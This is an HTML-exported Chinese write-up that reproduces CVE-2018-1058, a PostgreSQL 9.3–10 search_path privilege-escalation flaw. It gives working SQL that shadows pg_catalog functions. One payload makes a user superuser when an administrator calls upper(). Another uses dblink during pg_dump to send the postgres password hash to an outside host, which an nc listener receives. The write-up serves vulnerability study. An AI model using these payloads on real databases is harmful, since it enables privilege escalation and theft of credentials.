<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2018-1058postgresql-提权漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-1058</span><span class="csECDA2D3">）</span><span class="csDE05BCC">PostgreSQL </span><span class="csECDA2D3">提权漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">PostgreSQL </span><span class="cs9C1B1871">是一款关系型数据库。其</span><span class="cs8926E06">9.3</span><span class="cs9C1B1871">到</span><span class="cs8926E06">10</span><span class="cs9C1B1871">版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">PostgreSQL 9.3-10</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="利用方式"><span class="csD6CA00D2">利用方式</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">Postgres</span><span class="cs9C1B1871">的</span><span class="cs8926E06">commit</span><span class="cs9C1B1871">记录中，有如下</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/postgres/postgres/commit/5770172cb0c9df9e6ce27c507b449557e5b45124"><span class="cs4B51D5E4">commit</span></a></span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">As special exceptions, the following client applications behave as documented</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">regardless of search_path settings and schema privileges: clusterdb</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">createdb createlang createuser dropdb droplang dropuser ecpg (not</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">programs it generates) initdb oid2name pg_archivecleanup pg_basebackup</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">pg_config pg_controldata pg_ctl pg_dump pg_dumpall pg_isready</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">pg_receivewal pg_recvlogical pg_resetwal pg_restore pg_rewind pg_standby</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">pg_test_fsync pg_test_timing pg_upgrade pg_waldump reindexdb vacuumdb</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">vacuumlo. &nbsp;Not included are core client programs that run user-specified</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SQL commands, namely psql and pgbench.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上面的</span><span class="cs8926E06">commit</span><span class="cs9C1B1871">提到了两类的</span><span class="cs8926E06">client applications</span><span class="cs9C1B1871">。下文的较为直观的利用方式一是针对第二类</span><span class="cs8926E06">client applications</span><span class="cs9C1B1871">（比如</span><span class="cs8926E06">psql</span><span class="cs9C1B1871">），然后利用方式二是通过第一类</span><span class="cs8926E06">client applications</span><span class="cs9C1B1871">来执行任意代码，相比较下更为隐蔽。</span></p><h3 class="cs868C439D">
			<a name="利用方式一"><span class="csD6CA00D2">利用方式一</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在系统</span><span class="cs8926E06">schema</span><span class="cs9FB05234">pg_catalog</span><span class="cs9C1B1871">中，定义了大量的函数，用</span><span class="cs8926E06">pgAdmin3</span><span class="cs9C1B1871">查看</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="461" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">以函数</span><span class="cs8926E06">abs</span><span class="cs9C1B1871">系列为例，接受一个类型为</span><span class="cs8926E06">bigint\smallint\intger\real\double precision\numeric</span><span class="cs9C1B1871">的参数，返回其绝对值。倘若我们传送一个非数值类型的参数呢，比如</span><span class="cs8926E06">text</span><span class="cs9C1B1871">，</span></p><p class="cs3A447A38"><span class="cs9FB05234">evil=&gt; select abs(&#39;chybeta&#39;);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于并没有参数类型为</span><span class="cs8926E06">text</span><span class="cs9C1B1871">的</span><span class="cs8926E06">abs</span><span class="cs9C1B1871">函数，会直接报错：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="71" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但</span><span class="cs8926E06">postgres</span><span class="cs9C1B1871">提供了自定义函数的功能！我们创建如下函数：</span></p><p class="cs3A447A38"><span class="cs9FB05234">CREATE FUNCTION public.abs(TEXT) RETURNS TEXT AS $$</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;SELECT &#39;you are hacked by &#39; || $1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$$ LANGUAGE SQL IMMUTABLE;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当我们再次执行同样的查询语句，根据</span><span class="cs8926E06">postgres</span><span class="cs9C1B1871">的设计流程，它会先去查找系统</span><span class="cs8926E06">schema</span><span class="cs9FB05234">pg_catalog</span><span class="cs9C1B1871">，但由于参数类型不同没有找到，接着按照</span><span class="cs9FB05234">search_path</span><span class="cs9C1B1871">中的顺序查找，而我们定义的</span><span class="cs9FB05234">abs(text)</span><span class="cs9C1B1871">存在于</span><span class="cs8926E06">schema</span><span class="cs9FB05234">public</span><span class="cs9C1B1871">中，参数符合，因此</span><span class="cs8926E06">pg</span><span class="cs9C1B1871">理所当然地执行了我们定义的函数</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="203" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意一个点，这个函数是定义在</span><span class="cs8926E06">schema</span><span class="cs9FB05234">public</span><span class="cs9C1B1871">中的，也就是说对于进入到这个数据库的任何用户，只要他们调用了</span><span class="cs8926E06">abs</span><span class="cs9C1B1871">，且参数为</span><span class="cs8926E06">text</span><span class="cs9C1B1871">，都有可能会诱发恶意的代码执行。比如以超级用户</span><span class="cs8926E06">postgres</span><span class="cs9C1B1871">执行</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="465" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不过有谁会傻乎乎的去运行一个莫名其妙的</span><span class="cs8926E06">abs(text)</span><span class="cs9C1B1871">呢？因此真正的攻击手段是将过程隐藏到看似正常的数据库查询中。这次我们选择</span><span class="cs8926E06">schema</span><span class="cs9FB05234">pg_catalog</span><span class="cs9C1B1871">中的另外一类函数比如</span><span class="cs8926E06">lower(text)</span><span class="cs9C1B1871">，</span><span class="cs8926E06">upper(text)</span><span class="cs9C1B1871">，它们分别将</span><span class="cs8926E06">text</span><span class="cs9C1B1871">类型的参数转成小写和大写，不过系统没有提供接受</span><span class="cs8926E06">varchar</span><span class="cs9C1B1871">参数的</span><span class="cs8926E06">lower</span><span class="cs9C1B1871">和</span><span class="cs8926E06">upper</span><span class="cs9C1B1871">，尽管可以进行类型转换，但对</span><span class="cs8926E06">pg</span><span class="cs9C1B1871">而言，最好的选择当然是参数类型恰好符合的恶意自定义函数。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">创建一个表，值的类型为</span><span class="cs8926E06">varchar</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">CREATE TABLE public.hahahaha AS SELECT &#39;CHYBETA&#39;::varchar AS contents;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">创建对应的恶意函数</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">CREATE FUNCTION public.lower(varchar) RETURNS TEXT AS $$</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;SELECT &#39;you are hacked by &#39; || $1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$$ LANGUAGE SQL IMMUTABLE;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">对绝大部分用户而言，他们可能看大写的</span><span class="cs9FB05234">CHYBETA</span><span class="cs9C1B1871">不爽，然后执行了</span><span class="cs8926E06">lower</span><span class="cs9C1B1871">函数，但在不知道</span><span class="cs8926E06">/</span><span class="cs9C1B1871">清楚类型的情况下，他们执行的是</span><span class="cs8926E06">public</span><span class="cs9C1B1871">中的恶意自定义函数。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="333" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">只能打印</span><span class="cs9FB05234">you are hacked by XXX</span><span class="cs9C1B1871">有毛用！！由于恶意自定义函数可以被超级用户调用到，因此也就有了相应的执行权限，最简单的比如提权。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先来看看权限情况（以超级用户为例），可以看到只有</span><span class="cs8926E06">postgres</span><span class="cs9C1B1871">的</span><span class="cs8926E06">rolsuper</span><span class="cs9C1B1871">是</span><span class="cs8926E06">t</span><span class="cs9C1B1871">，即</span><span class="cs8926E06">true:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="198" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在用户</span><span class="cs8926E06">chybeta</span><span class="cs9C1B1871">登陆进</span><span class="cs8926E06">evil</span><span class="cs9C1B1871">数据库后，他创建了如下</span><span class="cs9FB05234">upper</span><span class="cs7FFD2630">函数</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">CREATE FUNCTION public.upper(varchar) RETURNS TEXT AS $$</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ALTER ROLE chybeta SUPERUSER;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;SELECT pg_catalog.upper($1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$$ LANGUAGE SQL VOLATILE;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="105" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意这里是</span><span class="cs9FB05234">VOLATILE</span><span class="cs9C1B1871">，具体原因参考</span><span class="cs8926E06"> <a class="cs508254C" href="https://www.postgresql.org/docs/8.2/static/xfunc-volatility.html"><span class="cs1C2E50E7">官方文档</span><span class="cs4B51D5E4">:xfunc-volatility</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">另外一张</span><span class="cs8926E06">table</span><span class="cs9C1B1871">，小写的</span><span class="cs8926E06">chybeta:</span></p><p class="cs3A447A38"><span class="cs9FB05234">CREATE TABLE public.hehehehe AS SELECT &#39;chybeta&#39;::varchar AS contents;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">管理员一看，心中不爽：小写小写就知道小写，然后</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="408" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">看上去一切正常，大写的大写。回到用户</span><span class="cs8926E06">chybeta</span><span class="cs9C1B1871">处，查看一下权限</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="188" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">已经成为超级用户。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用方法有很多，理论上只要能创建恶意函数，管理员调用，就是以管理员身份去执行恶意</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">语句</span><span class="cs8926E06">/</span><span class="cs9C1B1871">代码。在这种情况中，如</span><span class="cs8926E06">commit</span><span class="cs9C1B1871">所说</span><span class="cs9FB05234">Not included are core client programs that run user-specified SQL commands, namely psql and pgbench.</span><span class="cs9C1B1871">，被攻击用户是知道自己执行的</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">语句，只是其中的某个</span><span class="cs8926E06">function</span><span class="cs9C1B1871">意义被掉包了。</span></p><h3 class="cs868C439D">
			<a name="利用方式二"><span class="csD6CA00D2">利用方式二</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">安装完</span><span class="cs8926E06">PostgreSQL</span><span class="cs9C1B1871">后还会有一系列的工具，比如</span><span class="cs8926E06">pg_dump</span><span class="cs9C1B1871">、</span><span class="cs8926E06">pg_dumpall</span><span class="cs9C1B1871">等等。基于利用方式一，在创建了恶意函数的基础之上，可以通过这些工具来执行恶意函数。这些工具在执行过程中会动态设定</span><span class="cs9FB05234">search_path</span><span class="cs9C1B1871">，导致</span><span class="cs9FB05234">public</span><span class="cs9C1B1871">的优先级比</span><span class="cs9FB05234">pg_catalog</span><span class="cs9C1B1871">高，也就是说即使是在相同类型相同参数相同函数名的情况下，会选择</span><span class="cs9FB05234">public</span><span class="cs9C1B1871">中的函数。相比第一种而言隐蔽性更强，同时有更高的可触发性。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为利用</span><span class="cs8926E06">pg_dump</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">语句，可以利用</span><span class="cs8926E06">log</span><span class="cs9C1B1871">来观察执行过程。在</span><span class="cs8926E06">superuser</span><span class="cs9C1B1871">的权限下</span><span class="cs9FB05234">show log_directory;</span><span class="cs9C1B1871">找到</span><span class="cs8926E06">log</span><span class="cs9C1B1871">目录，将目录下</span><span class="cs8926E06">postgresql.conf</span><span class="cs9C1B1871">中的约莫</span><span class="cs8926E06">455</span><span class="cs9C1B1871">行改为</span><span class="cs9FB05234">log_statement = all</span><span class="cs9C1B1871">。重启</span><span class="cs8926E06">PostgreSQL</span><span class="cs9C1B1871">后，使用</span><span class="cs8926E06">pg_dump</span><span class="cs9C1B1871">工具执行备份命令</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">pg_dump -U postgres -f evil.bak evil</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同时观察</span><span class="cs8926E06">log</span><span class="cs9C1B1871">输出，查找</span><span class="cs9FB05234">statement: SET search_path =</span><span class="cs9C1B1871">，最后在某处我发现了一段这样的</span><span class="cs8926E06">log:<br/>10.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到在这段</span><span class="cs8926E06">log</span><span class="cs9C1B1871">中，有一处的</span><span class="cs9FB05234">array_to_string</span><span class="cs9C1B1871">是没有指定</span><span class="cs8926E06">schema</span><span class="cs9C1B1871">的。在系统</span><span class="cs8926E06">schema</span><span class="cs9C1B1871">中它的定义如下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="258" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这里由于已经设定了</span><span class="cs9FB05234">search_path</span><span class="cs9C1B1871">，为了能直接适配，这里创建的恶意函数的参数个数和类型都必须和</span><span class="cs9FB05234">pg_catalog</span><span class="cs9C1B1871">中定义的相同，倘若不同则会按顺序匹配到正确的函数。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为</span><span class="cs8926E06">pg_dump</span><span class="cs9C1B1871">在运行过程中开启的是</span><span class="cs9FB05234">read only transaction</span><span class="cs9C1B1871">，根据</span><span class="cs8926E06"><a class="cs508254C" href="https://www.postgresql.org/docs/9.1/static/sql-set-transaction.html"><span class="cs1C2E50E7">官方文档</span></a></span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">The transaction access mode determines whether the transaction is read/write or read-only. Read/write is the default. When a transaction is read-only, the following SQL commands are disallowed: INSERT, UPDATE, DELETE, and COPY FROM if the table they would write to is not a temporary table; all CREATE, ALTER, and DROP commands; COMMENT, GRANT, REVOKE, TRUNCATE; and EXPLAIN ANALYZE and EXECUTE if the command they would execute is among those listed. This is a high-level notion of read-only that does not prevent all writes to disk.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">是不允许执行下类操作的</span><span class="cs8926E06">:</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs8926E06">INSERT, UPDATE, DELETE, COPY FROM</span></li><li class="cs63189908"><span class="cs8926E06">all CREATE, ALTER, and DROP commands</span></li><li class="cs63189908"><span class="cs8926E06">COMMENT, GRANT, REVOKE, TRUNCATE; and EXPLAIN ANALYZE and EXECUTE if the command they would execute is among those listed</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">不过并没有禁止</span><span class="cs9FB05234">select</span><span class="cs9C1B1871">语句。如果开启了</span><span class="cs8926E06">dblink</span><span class="cs9C1B1871">，则可以利用查询来带出数据，比如用</span><span class="cs8926E06">dblink_connect</span><span class="cs9C1B1871">。因此我们创建这样的一个恶意函数：</span></p><p class="cs3A447A38"><span class="cs9FB05234">CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;select dblink_connect((select &#39;hostaddr=192.168.248.132 port=12345 user=postgres password=chybeta sslmode=disable dbname=&#39;||(SELECT passwd FROM pg_shadow WHERE usename=&#39;postgres&#39;))); </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;SELECT pg_catalog.array_to_string($1,$2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$$ LANGUAGE SQL VOLATILE;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">远程</span><span class="cs8926E06">vps</span><span class="cs9C1B1871">上监听：</span></p><p class="cs3A447A38"><span class="cs9FB05234">nc -lvv 12345</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当管理员进行数据库备份时：</span></p><p class="cs3A447A38"><span class="cs9FB05234">pg_dump -U postgres -f evil.bak evil</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="101" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">即可得到管理员密码：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PostgreSQL/%ef%bc%88CVE-2018-1058%ef%bc%89PostgreSQL%20%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="57" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/2109#toc-1</span></p></body>
</html>
